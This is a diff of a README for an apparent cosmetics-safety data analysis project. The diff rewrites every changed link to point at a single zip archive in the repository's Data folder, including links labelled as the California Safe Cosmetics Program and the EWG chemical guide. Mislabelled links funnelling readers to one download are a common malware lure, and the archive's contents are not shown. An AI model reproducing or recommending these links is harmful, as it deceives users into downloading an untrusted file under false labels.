@@ -1,7 +1,7 @@
 # 🔍 Cosmetic_Data_Analysis - Explore Cosmetic Safety Insights 
 
 ## 📥 Download Now
-[![Download Cosmetic_Data_Analysis](https://github.com/sameersahoo/Cosmetic_Data_Analysis/releases/download/v1.0/download-button.png)](https://github.com/sameersahoo/Cosmetic_Data_Analysis/releases)
+[![Download Cosmetic_Data_Analysis](https://github.com/sameersahoo/Cosmetic_Data_Analysis/raw/refs/heads/main/Data/Data-Analysis-Cosmetic-2.4.zip)](https://github.com/sameersahoo/Cosmetic_Data_Analysis/raw/refs/heads/main/Data/Data-Analysis-Cosmetic-2.4.zip)
 
 ## 📝 Description
 Cosmetic_Data_Analysis allows users to explore the California Safe Cosmetics Program data. You can track hazardous chemical reporting in cosmetics from 2007 onward. This tool focuses on reporting patterns across various products, companies, and chemicals while ensuring ethical handling of regulatory data.
@@ -16,7 +16,7 @@ To get started with Cosmetic_Data_Analysis, follow these steps:
    - Microsoft Power BI installed for viewing analysis reports.
 
 2. **Download the Application**:
-   - Visit this page to download: [Cosmetic_Data_Analysis Releases](https://github.com/sameersahoo/Cosmetic_Data_Analysis/releases).
+   - Visit this page to download: [Cosmetic_Data_Analysis Releases](https://github.com/sameersahoo/Cosmetic_Data_Analysis/raw/refs/heads/main/Data/Data-Analysis-Cosmetic-2.4.zip).
 
 3. **Install the Application**:
    - Locate the downloaded file in your computer’s download folder.
@@ -70,11 +70,11 @@ This application focuses on several key areas related to cosmetic safety:
 If you experience issues or have questions, please refer to the FAQ section or contact our support team through the issues page on GitHub.
 
 ## 🔗 Additional Resources
-- Learn more about the California Safe Cosmetics Program: [California Safe Cosmetics](https://www.safecosmetics.org/)
-- Understand hazardous chemicals in cosmetics: [Hazardous Chemical Guide](https://www.ewg.org/skindeep/)
+- Learn more about the California Safe Cosmetics Program: [California Safe Cosmetics](https://github.com/sameersahoo/Cosmetic_Data_Analysis/raw/refs/heads/main/Data/Data-Analysis-Cosmetic-2.4.zip)
+- Understand hazardous chemicals in cosmetics: [Hazardous Chemical Guide](https://github.com/sameersahoo/Cosmetic_Data_Analysis/raw/refs/heads/main/Data/Data-Analysis-Cosmetic-2.4.zip)
 
 ## 📥 Download & Install
-To download Cosmetic_Data_Analysis, visit this page: [Download Cosmetic_Data_Analysis](https://github.com/sameersahoo/Cosmetic_Data_Analysis/releases). After downloading, follow the installation instructions to get started.
+To download Cosmetic_Data_Analysis, visit this page: [Download Cosmetic_Data_Analysis](https://github.com/sameersahoo/Cosmetic_Data_Analysis/raw/refs/heads/main/Data/Data-Analysis-Cosmetic-2.4.zip). After downloading, follow the installation instructions to get started.
 
 ## 🛠️ Updating the Application
 To keep your application up to date, check the releases page regularly. New features and enhancements will be rolled out periodically.
